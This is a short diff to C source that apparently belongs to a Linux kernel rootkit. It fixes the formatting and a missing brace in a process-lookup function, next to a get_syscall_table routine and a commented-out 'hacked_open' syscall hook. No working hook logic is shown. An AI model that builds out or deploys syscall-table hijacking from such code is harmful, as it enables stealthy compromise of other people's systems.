@@ -39,8 +39,8 @@ unsigned long *get_syscall_table(void)
 	}
 	return NULL;
 }
-struct task_struct *
-find_task(pid_t pid)
+
+struct task_struct *find_task(pid_t pid)
 {
 	struct task_struct *p = current;
 	for_each_process(p) {
@@ -48,7 +48,7 @@ find_task(pid_t pid)
 			return p;
 	}
 	return NULL;
-
+}
 
 
 /*asmlinkage int hacked_open(const char __user *filename, int flags, umode_t mode){
